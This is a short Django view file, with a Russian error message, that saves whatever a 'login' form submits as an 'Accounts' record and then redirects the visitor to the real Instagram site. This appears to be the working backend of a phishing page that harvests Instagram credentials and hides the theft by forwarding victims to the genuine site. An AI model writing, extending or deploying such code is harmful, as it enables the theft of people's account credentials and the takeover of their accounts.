from django.shortcuts import render, redirect
from .forms import AccountsForm

def index(request):
    error = ''
    if request.method == 'POST':
        form = AccountsForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('https://www.instagram.com/')
        else:
            error = "Форма была неверной"

    form = AccountsForm()

    data = {
        'form': form,
        'error': error
    }

    return render(request, 'login/index.html', data)

# Create your views here.
